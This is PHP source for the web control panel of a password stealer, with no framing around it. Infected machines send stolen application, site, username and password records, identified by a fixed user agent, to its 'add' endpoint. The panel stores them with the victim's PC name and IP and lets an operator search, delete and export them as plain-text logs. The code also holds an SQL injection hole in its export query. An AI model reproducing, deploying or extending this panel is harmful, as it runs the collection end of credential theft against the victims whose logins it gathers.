<?php
session_start();
require 'config.php';
$connect = mysql_connect($hostname, $username, $password) or trigger_error(mysql_error(),E_USER_ERROR);
mysql_select_db($database) or die(mysql_error());
define(USER_AGENT, 'HardCore Software For : Public');
function query($data)
{
	if(get_magic_quotes_gpc())
	{
		$data = stripslashes($data);
	}
	$data = mysql_real_escape_string($data);
	return $data;
} 
function pages_number($total, $logsperpage, $fetched)
{
	$pagesnumber = ((ceil($total/$logsperpage) -1 ) >= 0) ? (ceil($total/$logsperpage) -1 ) : 0;
	$temp = "<strong>Page:</strong> ";
	
	if ($_GET['search'] == 'Search')
	{
		if (isset($_GET['page']))
		{
			$_SERVER['QUERY_STRING'] = str_replace('page='.$_GET['page'], '', $_SERVER['QUERY_STRING']);
		}
		$querystring = ($_SERVER['QUERY_STRING'] != '') ? '?'.$_SERVER['QUERY_STRING'].'&' : '?';
		$querystring = str_replace('&&', '&', $querystring);
	}
	else
	{
		$querystring = '?';
	}
	$ppage = (($_SESSION["page"]-1) >= 0) ? ($_SESSION["page"]-1) : $_SESSION["page"];
	$npage = (($_SESSION["page"]+1) <= $pagesnumber) ? ($_SESSION["page"]+1) : $_SESSION["page"];
	if ($_SESSION['page'] == 0)
	{
		$first = 'First -';
	}
	else
	{
		$first = ' <a href="'.$querystring.'page=0">First</a> -';
	}
	if ($ppage == $_SESSION['page'])
	{
		$previous = ' Previous -';
	}
	else
	{
		$previous = ' <a href="'.$querystring.'page='.$ppage.'">Previous</a> -';
	}
	if ($npage == $_SESSION['page'])
	{
		$next = ' Next -';
	}
	else
	{
		$next = ' <a href="'.$querystring.'page='.$npage.'">Next</a> -';
	}
	if ($_SESSION['page'] == $pagesnumber)
	{
		$last = ' Last';
	}
	else
	{
		
		$last = ' <a href="'.$querystring.'page='.($pagesnumber).'">Last</a>';
	}
	$temp .= $first.$previous.$next.$last;
	//$temp .= ' (Showing '.(($logsperpage*$_SESSION["page"])).' - '.(($_SESSION["page"]*$logsperpage)+$logsperpage).' of '.$total.' Results)';
	$temp .= ' (Showing '.($logsperpage*$_SESSION["page"]).' - '.(($logsperpage*$_SESSION["page"])+$fetched).' of '.$total.' Results)';
	return $temp;
}
if(isset($_POST['submit']))
{
	if ($_POST['username'] == $adminuser && $_POST['password'] == $adminpass)
	{
		$error = false;
		$_SESSION['logged'] = 'yes';
		$_SESSION["page"] = 0;
		$_SESSION["order"] = 'DESC';
	}
	else
	{
		$error = true;
	}
}
if(isset($_POST['delete']))
{
	if (isset($_POST["sel"]) && count($_POST["sel"])!=0)
	{

		for ($i=0; $i<count($_POST["sel"]); $i++)
		{
			if (is_numeric($_POST["sel"][$i]))
			{

				$result = mysql_query("DELETE FROM `logs` WHERE `id` = ".$_POST["sel"][$i]." LIMIT 1;");
				if (!$result) die(mysql_error());
				@mysql_free_result($result);
			}
		}
	}
	header("Location: index.php");
}
if (isset($_POST['export_all']))
{
if ($_SESSION['logged'] != 'yes') exit();
	header("Content-Type: text/plain");
	header("Content-Disposition: Attachment; filename=logs.ini");
	header("Pragma: no-cache");
	
	$result = mysql_query("SELECT * FROM logs;");
	while ($row = mysql_fetch_assoc($result))
	{
		echo 'Software:'."\t".$row['app']."\r\n";
		echo 'Sitename:'."\t".$row['url']."\r\n";
		echo 'Login:'."\t\t".$row['username'].':'.$row['password']."\r\n";
		echo 'PC Name:'."\t".$row['pcname']."\r\n";
		echo 'Date:'."\t\t".$row['date']."\r\n";
		echo '====================================='."\r\n\r\n";
	}
	@mysql_free_result($result);
	exit;
}
else if(isset($_POST['export']))
{
if ($_SESSION['logged'] != 'yes') exit();
	header("Content-Type: text/plain");
	header("Content-Disposition: Attachment; filename=logs.ini");
	header("Pragma: no-cache");
	if (count($_POST['sel']) > 0)
	{
		if (count($_POST['sel']) == 1)
		{
			$query .= 'id='.$_POST["sel"][0];
		}
		else
		{
			foreach ($_POST['sel'] as $key => $value)
			{
				$query .= 'id='.$value.' or ';
			}
		}
		$query .= ';';
		$query = str_replace(' or ;', ';', $query);
		$result = mysql_query("SELECT * FROM logs WHERE ".$query);
		while ($row = mysql_fetch_assoc($result))
		{
			echo 'Software:'."\t".$row['app']."\r\n";
			echo 'Sitename:'."\t".$row['url']."\r\n";
			echo 'Login:'."\t\t".$row['username'].':'.$row['password']."\r\n";
			echo 'PC Name:'."\t".$row['pcname']."\r\n";
			echo 'Date:'."\t\t".$row['date']."\r\n";
			echo '====================================='."\r\n\r\n";
		}
		@mysql_free_result($result);
	}
	exit;
}
if($_GET['search'] == 'Search')
{

	$search = query(trim($_GET['query']));
	$in = query(trim($_GET['in']));
}
if ($_GET['action'] == 'add')
{
	if ($_SERVER['HTTP_USER_AGENT'] == USER_AGENT)
	{
		if (isset($_GET["app"]) && isset($_GET["username"]) && isset($_GET["sitename"]) && isset($_GET["password"])&& isset($_GET["pcname"]))
		{
			foreach($_GET as $key => $value)
			{
				$data[$key] = query($value);
			}
			$result = mysql_query("SELECT id FROM `logs` WHERE `app` = '".urldecode($data["app"])."' AND `url` = '".urldecode($data["sitename"])."' AND `username` = '".urldecode($data['username'])."' AND `password` = '".urldecode($data['password'])."';");
			if (mysql_num_rows($result) == 0)
			{
				$results = mysql_query("INSERT INTO `logs` (`id`, `app`, `url`, `username`, `password`, `pcname`, `date`, `ip`)
									  VALUES (NULL ,'".urldecode($data["app"])."', '".urldecode($data["sitename"])."', '".urldecode($data['username'])."','".urldecode($data['password'])."', '".urldecode($data['pcname'])."', '".date("Y-m-d H:i:s")."', '".$_SERVER['REMOTE_ADDR']."');");
				@mysql_free_result($results);
			}
			@mysql_free_result($result);
		}
	}
	exit;
}
if (isset($_POST['ord']))
{
	$ord = query(trim($_POST['ord']));
	$query = mysql_query ("UPDATE options SET `order`='".$ord."';") or die(mysql_error);
	@mysql_free_result($query);
}
$id	= query(trim($_GET['id']));
$themes = array ('dark', 'light');
if (isset($_GET['action']) && $_GET['action'] == 'updatetheme' && $id <= 1 && $id != $themes[$id])
{
	$query = mysql_query ("UPDATE options SET theme='".$themes[$id]."';") or die(mysql_error);
	@mysql_free_result($query);
}
$result = mysql_query("SELECT * FROM options");
$theme = mysql_fetch_assoc($result);
$_SESSION['order'] = $theme['order'];

if (trim($_GET['action']) == 'logout')
{
	$_SESSION['logged'] = 'no';
	session_destroy();
	header("Location: index.php");
	exit;
}

$choices = array("app", "url", "username", "password", "pcname", 'ip', 'date');
if (!isset($_GET['search']))
{


	$totalq = mysql_query("SELECT id FROM logs");
	$total = mysql_num_rows($totalq);
}
else
{
	$totalq = mysql_query("SELECT id FROM `logs` WHERE `".$choices[$in]."` LIKE '%".$search."%' ORDER BY `date` ".$_SESSION['order'].";");
	$total = mysql_num_rows($totalq);
}
if (isset($_GET["page"]) && is_numeric($_GET["page"]) && $_GET["page"]>=0 && $_GET["page"]<=ceil($total/$logsperpage))
{
	$_SESSION["page"] = query($_GET["page"]);
}
else
{
	$_SESSION['page'] = 0;
}
@mysql_free_result($result);
@mysql_free_result($totalq);
?>
<html>
<head>
<title>(c) BOBBYJ</title>
<link rel='stylesheet' type='text/css' id="theme" href="style_<?php echo $theme['theme']; ?>.css"/>
<script language='javascript' type='text/javascript'>
function checkAll()
{
	chk = document.getElementsByName('sel[]');
	for (i = 0; i<chk.length; i++)
	{
		if (document.frm.elements['check_all'].checked) chk[i].checked = true; else chk[i].checked = false;
	}
}
function confirmation()
{
	chk = document.getElementsByName('sel[]');
	for (i = 0; i<chk.length; i++)
	{
		if (chk[i].checked == true)
		{
			return confirm('Are you sure you want to delete all selected logs?');
		}
	}
	alert('At least one option must be select.');
	return false;
}
</script>

</head>
<body>
<div id="wrapper">
<div id="header">
<form name='search' method='POST' action="<?php echo $_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING']; ?>">
      <div id="themeswitch"> <strong>Sorting Logs:</strong> 
        <select name='ord'>
<option <?php if($_SESSION['order'] == 'ASC') echo 'selected=selected'; else echo 'onclick="this.form.submit()"' ?> value='ASC'>Oldest First</option>
<option <?php if($_SESSION['order'] == 'DESC') echo 'selected=selected'; else echo 'onclick="this.form.submit()"' ?> value='DESC'>Newest First</option>
</select>
      </div>
</form>
<div style="clear: both"></div>
<div id="searchform">
	<form name='search' method='GET' action='index.php?action=search'>
		<strong>Search for:</strong> <input type='text' name='query' size='20' value="<?php echo $search; ?>"> In: <select name='in'>
		<option <?php if($in == 0) echo 'selected=selected'; ?> value='0'>Softwares</option>
		<option <?php if($in == 1) echo 'selected=selected'; ?> value='1'>Sitename</option>
		<option <?php if($in == 2) echo 'selected=selected'; ?> value='2'>Username</option>
		<option <?php if($in == 3) echo 'selected=selected'; ?> value='3'>Password</option>
		<option <?php if($in == 4) echo 'selected=selected'; ?> value='4'>PC Name</option>
		<option <?php if($in == 5) echo 'selected=selected'; ?> value='5'>IP Address</option>
		<option <?php if($in == 6) echo 'selected=selected'; ?> value='6'>Date</option>
		</select>
		<input type='submit' value='Search' name='search'>
	</form>
</div>
<p id="slogan"></p>
</div>
<div id="menu">
<a href="index.php">Home</a> | <a href="?action=logout">Logout</a></span>
</div>
<div id="container">
<div id="main">
<?php
if ($_GET['action'] != 'about')
{
if ($_SESSION['logged'] == 'yes')
{
?>
<form name='frm' method='POST' action=''>
<table cellpadding="0" cellspacing="0" border="0" width="100%">
<tr class="heading">
<td style="width:5px;"><input type="checkbox" name='check_all' onClick='checkAll();' /></td>
<td class="head" style="width: 10%;">App Name</td>
<td class="head">Sitename</td>
<td class="head">Username</td>
<td class="head">Password</td>
<td class="head">PC Name</td>
<td class="head">IP Address</td>
<td class="head">Date</td>
</tr>
<?php
if ($_GET['search'] == 'Search' && $search != '')
{
	if ($search == '' || $in == '')
	{
		echo '<tr><td colspan="6" style="text-align:center;">You forgot the Search Query</td></tr>';
	}
	else if (isset($in) && is_numeric($in) && $in <= 6 && $search != '')
	{
		$result = mysql_query("SELECT * FROM `logs` WHERE `".$choices[$in]."` LIKE '%".$search."%' ORDER BY `date` ".$_SESSION['order']." LIMIT ".($logsperpage*$_SESSION["page"])." , ".$logsperpage.";");
		$fetched = mysql_num_rows($result);
		if (mysql_num_rows($result) > 0)
		{
			$i = 0;
			while ($row = mysql_fetch_array($result))
			{
				$class = ($i % 2 != 0) ? "al" : '';
				echo '
					  <tr class="'.$class.'">
					  <td style="width:5px;"><input type="checkbox" name="sel[]" value="'.$row['id'].'" /></td>
					  <td style="width: 10%;">'.$row['app'].'</td>
					  <td style="width: 25%;">'.$row['url'].'</td>
					  <td style="width: 15%;">'.$row['username'].'</td>
					  <td style="width: 10%;">'.$row['password'].'</td>
					  <td style="width: 8%;">'.$row['pcname'].'</td>
					  <td style="width: 12%;">'.$row['ip'].'</td>
					  <td>'.$row['date'].'</td>
					  </tr>
				';
				$i++;
			}
		}
		else
		{
			echo '<tr><td colspan="8" style="text-align:center;">No Result found.. :(</td></tr>';
		}
		@mysql_free_result($result);
	}
}
else
{
	if ($total > 0)
	{
		$result = mysql_query("SELECT * FROM `logs` ORDER BY `date` ".$_SESSION['order']." LIMIT ".($logsperpage*$_SESSION["page"])." , ".$logsperpage.";");
		$i = 0;
		$fetched = mysql_num_rows($result);
		while ($row = mysql_fetch_assoc($result))
		{
			$class = ($i % 2 != 0) ? "al" : '';
			echo '
				  <tr class="'.$class.'">
				  <td style="width:5px;"><input type="checkbox" name="sel[]" value="'.$row['id'].'" /></td>
				  <td style="width: 10%;">'.$row['app'].'</td>
				  <td style="width: 25%;">'.$row['url'].'</td>
				  <td style="width: 15%;">'.$row['username'].'</td>
				  <td style="width: 13%;">'.$row['password'].'</td>
				  <td style="width: 8%;">'.$row['pcname'].'</td>
				  <td style="width: 12%;">'.$row['ip'].'</td>
				  <td>'.$row['date'].'</td>
				  </tr>
			';
			$i++;
		}
		@mysql_free_result($result);
	}
	else
	{
		echo '<tr><td colspan="8" style="text-align:center;">No Logs found.. :(</td></tr>';
	}
}
?>
</table>
<div class="title page">
<span class="paging"><?php echo pages_number($total, $logsperpage, $fetched); ?></span><span class="buttons"><input type="submit" name="delete" value="Delete" onclick="if (!confirmation()) return false;" /> | <input type="submit" name="export" value="Export" /> | <input type="submit" name="export_all" value="Export All Logs" />
</div>
</form>
<?php
} else {
if ($error)
{
	echo '<div style="color:#FF0000; font-weight:bold;">Incorrect Username/Password</div>';
}
?>
<form style="" method="post" action="">
<span class="login">Please enter your password:</span><br /><br />
<span class="login">Username:</span><input name="username" type="text" size="25"> <br /><br />
<span class="login">Password:</span><input name="password" type="password" size="25"><br />
<input type="submit" name="submit" value="Login">
</form>
<?php
}
}
else
{
?>

<?php } ?>
</div> <!-- end of main-->
</div>
<div id="footer">
<!-- Do not remove or modify copyright notice in any way -->
    <p>Powered By <a href="http://www.Pegor.com">BOBBYJ</a></p>
</div>

</body>
</html>
<?php mysql_close($connect); ?>